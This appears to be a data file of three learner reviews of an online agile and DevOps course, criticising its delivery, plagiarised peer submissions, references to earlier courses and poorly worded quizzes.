101060438~COURSE!~kzmY_qA-EeWHXAr1OpR7HQ,1649612177509,1,0,"Based on my personal experience, I would advise against taking this course.  T​he content is OK, but the delivery leaves something to be desired.  Ironically for a course talking about agile and lean start up philosophies, this is delivered in the extremely old-fashioned way of having someone talk at you (also, if I'm honest, in a quite American waffle, which isn't particularly user-friendly for those whose first language isn't American English).  Oh, that said, they do give you about 3 minutes of a ridiculous 'skit' to illustrate the point... But really nothing innovative or experimental at all here..! H​owever, much, much worse than that is the fact that it is a hotbed for people who want to 'scam' a qualification.  There appears to be no vetting of 'students' whatsoever.  The majority of the submissions that I was required to review were one and the same document (that is, exactly the same, not one word changed).  Because I had to report them for plagiarism, this also meant that they don't count towards the total no. of peer reviews completed, meaning it's extremely difficult to finish the course and earn the certificate, as there are really no genuine submissions at all it seems. (The few I did manage to complete were mostly just copied and pasted from the internet).  Pessimal experience, and the same goes for the related courses - Managing an Agile Team, Agile Analytics and Agile Meets Design Thinking.  A​lso, if you alert Coursera to this and / or ask how to complain, the 'customer help service' just repeats the same thing over and over regarding the plagiarism function and ignores the complaint request outright, every single time. In my opinion this is disgusting for a course that is this expensive. ​ Save yourself some time and hassle - best avoided. ",0,4,Laura Wallis,101060438

20019283~COURSE!~kzmY_qA-EeWHXAr1OpR7HQ,1467496475339,2,0,"This course is not meant to stand alone as a single course, rather is a portion of a larger Agile Development course. I'm sure the information included is very informative, but it references information that was included in other courses. The first lessons start with diagrams that are not explained and terms that are not defined (which I presume were probably covered in the first course). Also plenty of references to information from other courses (""Previously we learned"" ""Remember the example"").Dropped the course, not that I didn't understand it, but rather it was not worth my time to play ""catch-up"" on my own.

45862334~COURSE!~kzmY_qA-EeWHXAr1OpR7HQ,1590590153309,3,0,"The change in specialization structure is very obvious still. There are multiple places that refer to a ""previous course"" that hasn't happened yet if you are following the new specialization. The course also feels a bit mishmashed together in places with frequent jumps between the main hypothesis driven development videos and the DevOps/Continuous delivery videos. These two topics do relate to each other but it feels weird taking the course when you  just jump back and forth between the topics in a seemingly random fashion. There are also a few quiz questions that are very poorly worded, as in they aren't close to grammatically correct. I was still able to figure them out but they should be reviewed and updated. Finally this course is packed with the ""interview"" videos. These are good resources overall but it's awkward how there are like 6 different 5-10 minute videos with the same person in overlapping topics. I would have much preferred to just have longer interview videos that didn't duplicate the content as much and contained the full conversation with each person.",0,0,Corwin Lawrence,45862334
